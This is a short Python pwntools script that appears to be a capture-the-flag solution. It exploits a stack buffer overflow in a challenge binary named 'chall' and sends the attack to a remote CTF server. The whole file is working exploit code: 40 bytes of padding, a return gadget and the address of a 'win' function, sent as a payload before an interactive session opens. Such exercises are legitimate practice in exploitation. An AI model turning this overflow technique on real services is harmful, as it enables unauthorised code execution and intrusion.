from pwn import *

win_addr = p64(0x400707)
offset = 40
ret_addr = p64(0x4005ae)
gdbscript = """
b *here+81
continue
"""
#p = gdb.debug("./chall", gdbscript=gdbscript)
#p = process("./chall")
p = remote("europe.pwn.zh3r0.ml", 3456)

p.recvuntil("name:")
payload = "A"*offset + ret_addr + win_addr
open("a.txt","w").write(payload)
p.sendline(payload)
p.interactive()
